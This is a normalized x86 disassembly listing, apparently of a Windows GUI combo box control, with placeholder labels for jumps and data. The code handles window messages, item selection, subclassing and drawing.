mov [ fs : eax ] edx
push sub_42f7df
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
jmp [ eax * 4 + jump_table_42f6a8 ]
mov eax edi
mov si 0xffe9
call sub_403430
jmp r-xdata
mov eax edi
mov si 0xffb3
call sub_403430
jmp r-xdata
mov [ edi + 0x25d ] 0x0
mov eax edi
mov si 0xffb1
call sub_403430
mov eax edi
mov edx [ eax ]
call [ edx + 0xf0 ]
cmp [ edi + 0x25d ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
lea ecx [ ebp - 0x4 ]
mov eax [ edi + 0x23c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_437388
mov eax edi
mov si 0xffeb
call sub_403430
mov eax edi
mov si 0xffb2
call sub_403430
jmp r-xdata
mov eax edi
mov si 0xffb0
call sub_403430
jmp r-xdata
mov [ edi + 0x25e ] 0x1
mov [ edi + 0x25d ] 0x1
mov eax edi
call sub_43c2c4
jmp r-xdata
mov [ edi + 0x25e ] 0x0
mov [ edi + 0x25d ] 0x1
mov eax edi
call sub_43c3b0
push 0x0
push 0x0
push 0x1f
mov eax edi
call sub_43db40
push eax
call PostMessageA
cmp [ edi + 0x25e ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x14f
mov eax edi
call sub_43db40
push eax
call PostMessageA
jmp r-xdata
sub_42f80c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov esi ecx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x208 ]
call sub_435f4c
cmp [ ebx + 0x282 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x208 ]
call sub_41cda8
test esi esi
jl r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov ax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x284 ]
call [ ebx + 0x280 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f8bc
lea eax [ ebp - 0x14 ]
call sub_403f6c
retn
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ ebx + 0x23c ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x10 ]
add edx 0x2
mov ecx [ ebp - 0xc ]
mov eax [ ebx + 0x208 ]
call sub_41cf4c
sub_42f8e8
push esi
push edi
mov esi eax
mov eax esi
call sub_439414
mov edi [ esi + 0x214 ]
cmp edi 0xffffffff
je r-xdata
pop edi
pop esi
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
sub_42f910
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax esi
call sub_43de44
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
call GetFocus
cmp eax [ esi + 0x240 ]
je r-xdata
mov bl 0x1
cmp eax [ esi + 0x244 ]
je r-xdata
xor ebx ebx
jmp r-xdata
sub_42f964
push ebx
push esi
cmp [ eax + 0x222 ] 0x0
je r-xdata
mov si 0xffb3
call sub_403430
pop esi
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x224 ]
call [ ebx + 0x220 ]
pop esi
pop ebx
retn
sub_42f990
push ebx
mov ebx eax
mov eax ebx
call sub_43aaf8
push 0x0
mov eax [ ebx + 0x20c ]
push eax
push 0x141
mov eax ebx
call sub_43db40
push eax
call SendMessageA
xor eax eax
mov [ ebx + 0x240 ] eax
xor eax eax
mov [ ebx + 0x244 ] eax
pop ebx
retn
sub_42f9c8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x104 ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
cmp ebx eax
jle r-xdata
cmp ebx 0x1
jge r-xdata
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x25c ] 0x1
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x9e
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xfc ]
imul ebx
mov edx [ ebp - 0x4 ]
add eax [ edx + 0x4c ]
add eax 0x2
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
push eax
call SetWindowPos
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fa65
mov eax [ ebp - 0x4 ]
mov [ eax + 0x25c ] 0x0
retn
mov ebx 0x1
sub_42fa65
push 0x5f
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
push eax
call SetWindowPos
pop ebx
pop ecx
pop ebp
retn
sub_42fa84
push esi
push edi
mov esi eax
mov edi [ esi + 0x23c ]
test edi edi
je r-xdata
mov [ esi + 0x23c ] edx
pop edi
pop esi
retn
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop edi
pop esi
retn
sub_42fab4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fb3a
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
lea ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x23c ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax esi
pop edx
mov ebx [ eax ]
call [ ebx + 0xd4 ]
sub_42fb40
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_42fb80
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_40441c
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x23c ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fbd0
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_42fbd8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_42edc0
mov eax ebx
mov edx [ eax ]
call [ edx + 0xf8 ]
mov dl 0x1
call sub_403204
mov esi eax
mov [ ebx + 0x23c ] esi
mov [ esi + 0x10 ] ebx
mov [ ebx + 0x238 ] 0x10
mov [ ebx + 0x276 ] 0x0
xor eax eax
mov [ ebx + 0x26c ] eax
mov [ ebx + 0x268 ] 0x1
mov [ ebx + 0x290 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_42fc5c
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax [ esi + 0x23c ]
call sub_403234
mov eax [ esi + 0x278 ]
call sub_403234
mov edx ebx
and dl 0xfc
mov eax esi
call sub_42eeb4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_42fcac
push ebx
mov ebx eax
cmp dl [ ebx + 0x276 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x276 ] dl
cmp dl 0x1
jne r-xdata
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
call sub_43b0e0
sub_42fd10
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43a9cc
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_43a8f8
mov eax [ esi + 0x4 ]
or eax 0x200240
xor edx edx
mov dl [ ebx + 0x276 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x275 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x274 ]
or eax [ edx * 4 + rw-data ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
retn
sub_42fd71
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov ebx eax
mov eax ebx
call sub_42f990
mov eax ebx
call sub_43db40
mov [ ebx + 0x248 ] eax
mov esi [ ebx + 0x278 ]
test esi esi
je r-xdata
mov al [ ebx + 0x276 ]
sub al 0x2
jae r-xdata
mov edx esi
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebx + 0x278 ]
call sub_403234
xor eax eax
mov [ ebx + 0x278 ] eax
cmp [ ebx + 0x260 ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x5
mov eax ebx
call sub_43db40
push eax
call GetWindow
mov esi eax
test esi esi
je r-xdata
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebx + 0x260 ]
jge r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x240 ] 0x0
je r-xdata
cmp [ ebx + 0x276 ] 0x1
jne r-xdata
push 0x0
mov eax [ ebx + 0x260 ]
push eax
push 0x14e
mov eax ebx
call sub_43db40
push eax
call SendMessageA
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebx + 0x260 ] eax
push 0x0
push 0x3
push 0xd3
mov eax [ ebx + 0x240 ]
push eax
call SendMessageA
mov edi esi
mov [ ebx + 0x240 ] edi
push 0xfffffffc
push edi
call GetWindowLongA
mov [ ebx + 0x250 ] eax
mov eax [ ebx + 0x24c ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x240 ]
push eax
call SetWindowLongA
mov edi esi
mov [ ebx + 0x244 ] edi
push 0xfffffffc
push edi
call GetWindowLongA
mov [ ebx + 0x258 ] eax
mov eax [ ebx + 0x254 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x244 ]
push eax
call SetWindowLongA
push 0x2
push esi
call GetWindow
mov esi eax
sub_42feb4
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax ebx
call sub_43aedc
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebx + 0x260 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov esi eax
mov [ ebx + 0x278 ] esi
mov edx [ ebx + 0x23c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_42ff04
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x276 ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x170 ]
call sub_41ca38
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
mov [ esi + 0xc ] 0x1
jmp r-xdata
add esp 0x10
pop esi
pop ebx
retn
sub_42ff58
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push ebx
push 0x140
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43db40
push eax
call SendMessageA
mov eax [ esi ]
cmp eax [ ebx ]
seta al
pop esi
pop ebx
pop ebp
retn
sub_42ff84
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_437358
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x140
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43db40
push eax
call SendMessageA
mov ecx [ ebp - 0x8 ]
sub ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
inc edx
lea eax [ ebp - 0xc ]
call sub_4044cc
push 0x0
push 0xffffffff
push 0x14e
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43db40
push eax
call SendMessageA
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xc ]
call sub_437388
mov bx [ ebp - 0x4 ]
mov edx ebx
mov eax ebx
call sub_406884
push eax
push 0x0
push 0x142
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43db40
push eax
call SendMessageA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430047
lea eax [ ebp - 0xc ]
call sub_403f6c
retn
sub_43004c
push ebp
mov ebp esp
mov ecx 0xb
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43cb24
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x268 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43040b
lea eax [ ebp - 0x58 ]
mov edx 0x5
call sub_403f90
lea eax [ ebp - 0x44 ]
call sub_403f6c
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_403f90
lea eax [ ebp - 0x38 ]
mov edx 0x2
call sub_403f90
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_403f90
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x276 ]
sub al 0x2
jae r-xdata
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x26c ]
cmp eax 0x1f4
jb r-xdata
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
call sub_437358
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
add eax 0x270
call sub_403fc0
jmp r-xdata
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
mov eax [ ebp - 0x4 ]
add eax 0x270
call sub_403f6c
mov al [ ebx ]
sub al 0x8
je r-xdata
push ebp
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
call sub_42ff58
pop ecx
test al al
je r-xdata
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x276 ]
sub al 0x2
jae r-xdata
push ebp
call sub_42ff84
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x269 ] 0x0
je r-xdata
sub al 0x12
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_40422c
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_40bc54
cmp al 0x2
je r-xdata
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_437358
mov eax [ ebp - 0x38 ]
call sub_40422c
test eax eax
jle r-xdata
mov [ ebx ] 0x0
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_403430
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_42ef80
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x269 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_40422c
mov edx eax
mov eax [ ebp - 0x4 ]
add eax 0x270
mov ecx 0x1
call sub_4044cc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_40422c
mov edx eax
mov eax [ ebp - 0x4 ]
add eax 0x270
mov ecx 0x1
call sub_4044cc
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_437358
mov esi [ ebp - 0x8 ]
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_42efa4
jmp r-xdata
push ebp
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
call sub_42ff58
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_42ef80
test al al
jne r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
call sub_40bc54
cmp al 0x2
je r-xdata
lea eax [ ebp - 0x50 ]
mov dl [ ebx ]
call sub_404154
mov ecx [ ebp - 0x50 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x270 ]
lea eax [ ebp - 0x14 ]
call sub_404278
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
mov ecx [ ebp - 0x8 ]
mov edx 0x1
call sub_40448c
mov eax [ ebp - 0x48 ]
push eax
lea eax [ ebp - 0x4c ]
mov dl [ ebx ]
call sub_404154
mov ecx [ ebp - 0x4c ]
lea eax [ ebp - 0x14 ]
pop edx
call sub_404278
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_42efa4
dec esi
lea eax [ ebp - 0x10 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0x14 ]
call sub_40448c
push 0x0
push 0xffffffff
push 0x14e
mov eax [ ebp - 0x4 ]
call sub_43db40
push eax
call SendMessageA
lea eax [ ebp - 0x40 ]
push eax
mov edx [ ebp - 0xc ]
inc edx
mov ecx 0x7fffffff
mov eax [ ebp - 0x14 ]
call sub_40448c
mov ecx [ ebp - 0x40 ]
lea eax [ ebp - 0x3c ]
mov edx [ ebp - 0x10 ]
call sub_404278
mov edx [ ebp - 0x3c ]
mov eax [ ebp - 0x4 ]
call sub_437388
mov edi esi
dec edi
mov edx edi
mov eax edi
call sub_406884
push eax
push 0x0
push 0x142
mov eax [ ebp - 0x4 ]
call sub_43db40
push eax
call SendMessageA
lea edx [ ebp - 0x44 ]
mov eax [ ebp - 0x4 ]
call sub_437358
mov edx [ ebp - 0x44 ]
mov eax [ ebp - 0x4 ]
add eax 0x270
call sub_403fc0
jmp r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_430414
test al al
je r-xdata
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43db40
push eax
lea eax [ ebp - 0x30 ]
push eax
call PeekMessageA
test eax eax
je r-xdata
mov al [ ebx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov [ ebx ] 0x0
cmp [ ebp - 0x2c ] 0x102
jne r-xdata
lea eax [ ebp - 0x58 ]
mov dl [ ebp - 0x28 ]
call sub_404154
mov ecx [ ebp - 0x58 ]
lea eax [ ebp - 0x54 ]
mov edx [ ebp - 0x14 ]
call sub_404278
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x4 ]
call sub_430414
test al al
je r-xdata
push 0x1
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43db40
push eax
lea eax [ ebp - 0x30 ]
push eax
call PeekMessageA
mov [ ebx ] 0x0
jmp r-xdata
sub_430414
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_40422c
test eax eax
jne r-xdata
mov eax esi
call sub_40442c
push eax
push 0xffffffff
push 0x14c
mov eax ebx
call sub_43db40
push eax
call SendMessageA
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
or edx 0xffffffff
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax ebx
mov si 0xffb3
call sub_403430
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4305d0
lea eax [ ebp - 0x1c ]
call sub_403f6c
lea eax [ ebp - 0x18 ]
mov edx 0x3
call sub_403f90
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
cmp eax [ ebp - 0x8 ]
setne [ ebp - 0x9 ]
cmp [ ebx + 0x290 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
push 0x14e
mov eax ebx
call sub_43db40
push eax
call SendMessageA
mov al [ ebx + 0x276 ]
sub al 0x2
jae r-xdata
mov edx esi
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
inc eax
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
lea eax [ ebx + 0x270 ]
mov edx esi
call sub_403fc0
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x23c ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x18 ]
push eax
mov eax esi
call sub_40422c
mov edx eax
inc edx
mov ecx 0x7fffffff
pop eax
call sub_40448c
mov ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x10 ]
mov edx esi
call sub_404278
mov edx [ ebp - 0x10 ]
mov eax ebx
call sub_437388
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_437358
mov eax [ ebp - 0x1c ]
call sub_40422c
push eax
mov eax esi
call sub_40422c
pop edx
call sub_406884
push eax
push 0x0
push 0x142
mov eax ebx
call sub_43db40
push eax
call SendMessageA
jmp r-xdata
push 0x0
push 0x0
push 0x14f
mov eax ebx
call sub_43db40
push eax
call SendMessageA
mov eax ebx
mov si 0xffeb
call sub_403430
mov eax ebx
mov si 0xffb2
call sub_403430
cmp [ ebp - 0x9 ] 0x0
je r-xdata
sub_4305fc
push ebx
push esi
push edi
push ebp
mov esi eax
mov ebx [ edx + 0x8 ]
mov di [ ebx + 0x10 ]
mov ebp [ ebx + 0x10 ]
test ebp 0x1000
je r-xdata
test ebp 0x20
je r-xdata
or di 0x1000
mov edx [ ebx + 0x18 ]
mov eax [ esi + 0x208 ]
call sub_41d23c
mov edx [ esi + 0x68 ]
mov eax [ esi + 0x208 ]
call sub_41d0dc
mov edx [ esi + 0x170 ]
mov eax [ esi + 0x208 ]
call sub_41d0f8
cmp [ ebx + 0x8 ] 0x0
jl r-xdata
or di 0x20
mov ebp [ ebx + 0x8 ]
test ebp ebp
jl r-xdata
test di 0x1
je r-xdata
lea edx [ ebx + 0x1c ]
mov eax [ esi + 0x208 ]
call sub_41cda8
push edi
lea ecx [ ebx + 0x1c ]
mov edx ebp
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x110 ]
jmp r-xdata
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_41ca04
mov eax [ esi + 0x208 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_41c238
xor edx edx
mov eax [ esi + 0x208 ]
call sub_41d23c
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x1c ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call DrawFocusRect
test di 0x10
je r-xdata
sub_4306d4
push ebx
push esi
mov esi eax
mov eax [ edx + 0x8 ]
mov edx [ esi + 0x238 ]
mov [ eax + 0x10 ] edx
cmp [ esi + 0x276 ] 0x4
jne r-xdata
pop esi
pop ebx
retn
lea ecx [ eax + 0x10 ]
mov edx [ eax + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x114 ]
sub_430700
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_4389dc
mov eax ebx
call sub_437580
test al al
je r-xdata
cmp [ ebx + 0x276 ] 0x2
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_44e0b4
test eax eax
je r-xdata
push 0x15
call GetSystemMetrics
mov edx [ ebx + 0x48 ]
sub edx eax
movsx eax [ esi + 0x8 ]
cmp edx eax
jle r-xdata
cmp ebx [ eax + 0x220 ]
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
or ecx 0xffffffff
xor edx edx
mov eax ebx
call sub_437a00
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_437590
sub_430778
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi ]
add eax 0xffff42ce
sub eax 0x7
jae r-xdata
mov edx esi
mov eax ebx
call sub_42f56c
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
cmp [ ebx + 0x276 ] 0x2
jae r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x170 ]
call sub_41ca38
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_4307d4
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_43bcd0
cmp [ ebx + 0x165 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cb54
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_435f34
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx [ ebx + 0x70 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41ca04
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_41cde4
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x14 ]
push eax
call InflateRect
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_41cde4
cmp [ ebx + 0x165 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403234
retn
xor esi esi
cmp [ ebx + 0x163 ] 0x0
je r-xdata
cmp [ ebx + 0x164 ] 0x0
je r-xdata
add esi [ ebx + 0x168 ]
test esi esi
jne r-xdata
add esi [ ebx + 0x168 ]
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_436cf8
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_41d1bc
push eax
call GetWindowLongA
mov edi eax
test [ ebx + 0x162 ] 0x1
je r-xdata
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx [ ebx + 0x70 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41ca04
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_41cde4
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x14 ]
push eax
call InflateRect
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_41cde4
test [ ebx + 0x162 ] 0x2
je r-xdata
sub [ ebp - 0x24 ] esi
test [ ebx + 0x162 ] 0x4
je r-xdata
sub [ ebp - 0x20 ] esi
test edi 0x200000
je r-xdata
add [ ebp - 0x1c ] esi
test [ ebx + 0x162 ] 0x8
je r-xdata
push 0x14
call GetSystemMetrics
add [ ebp - 0x1c ] eax
test edi 0x100000
je r-xdata
add [ ebp - 0x18 ] esi
xor eax eax
mov al [ ebx + 0x162 ]
xor edx edx
mov dl [ ebx + 0x165 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x1a5 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
xor eax eax
mov al [ ebx + 0x163 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x164 ]
or eax [ edx * 4 + rw-data ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41d1bc
push eax
call DrawEdge
push 0xa
call GetSystemMetrics
mov edx [ ebp - 0xc ]
sub edx eax
dec edx
mov [ ebp - 0x14 ] edx
